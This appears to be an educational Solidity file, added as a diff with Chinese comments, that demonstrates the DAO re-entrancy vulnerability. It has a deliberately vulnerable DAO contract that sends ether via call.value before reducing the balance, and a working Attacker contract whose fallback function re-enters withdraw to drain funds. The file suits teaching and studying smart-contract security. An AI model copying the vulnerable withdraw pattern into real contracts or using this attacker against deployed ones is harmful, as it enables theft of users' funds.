@@ -1,0 +1,98 @@
+pragma solidity ^0.4.0;
+
+
+//re-entry attack, DAO  漏洞 
+// 外部函数调用的安全性问题 
+contract  DAO {
+    
+    mapping (address => uint) public balances;
+    
+    function getBalance() returns (uint256){
+        return this.balance;
+    }
+    
+    function deposit() payable{
+        balances[msg.sender]+=msg.value;
+    }
+    
+    function withdraw(uint amount){
+        if(balances[msg.sender]<amount) throw;
+        //call.value 同  sender 、 transfer  类似，向外转钱 
+        //  调用另外一个合约的函数，其实就是把执行权给了那个合约 
+        //msg.sender可以是一个合约地址 
+        //msg.sender.transfer() //该函数有gas limit 23000， 该gas 很少， 不能做其他操作
+        // 执行失败的时候 ，会  throw  exception，后续代码无法执行  
+        //msg.sender.send()， 一半像transfer , 有 23000 的 gas limit
+        //像 call.value, 执行失败的时候 ， 会返回false， 不会throw  exception
+        // 使用  send  或  call.value 一定要检查  返回值。
+        //
+        msg.sender.call.value(amount)();// 没有23000的gas limit， 失败的时候只返回false
+        // 这里  的  call  会 会调用  Attacker 的 匿名 函数。
+        
+        //Attacker.attck  调用的时候， 当 msg.sender.call.value  执行的时候 ，
+        //会触发 Attacker 的   匿名函数 ，该匿名函数又调用 withdraw，
+        // 导致  最后  一句话  的  amount   未 未扣减， 第一行 的 if  无效 
+
+        balances[msg.sender]-=amount;
+    }
+    
+    
+    
+}
+
+
+contract MiniDAOabstract{
+    mapping (address => uint) public banances;
+    
+    function deposit() payable{
+        
+    }
+    
+    function withdraw (uint amount){
+        
+    }
+    
+    
+}
+
+
+
+contract Attacker{
+    // limit the recursive calls to prevent out-of-gas error
+    uint public stack=0;
+    uint constant stacklimit=10;
+    uint public amount;
+    MiniDAOabstract dao;
+    
+    function getBalance() returns (uint){
+     
+        return this.balance;
+    }
+    
+    function Attacker(address daoAddress) payable{
+        dao=MiniDAOabstract(daoAddress);
+        amount=msg.value;
+        dao.deposit.value(msg.value)();
+    }
+    
+    function attack(){
+        dao.withdraw(amount);
+    }
+    
+    // 匿名函数  fallback函数  ,  当 有人 给他付钱  的 的时候 ， 或 别人调用了 一个不 存在  的 
+    // 函数， 这个匿名函数就会被调用 
+    function() payable{
+        if(stack++<10){
+            dao.withdraw(amount);
+        }
+    }
+    
+    function resolve(){
+        selfdestruct(msg.sender);
+    }
+}
+
+
+
+
+
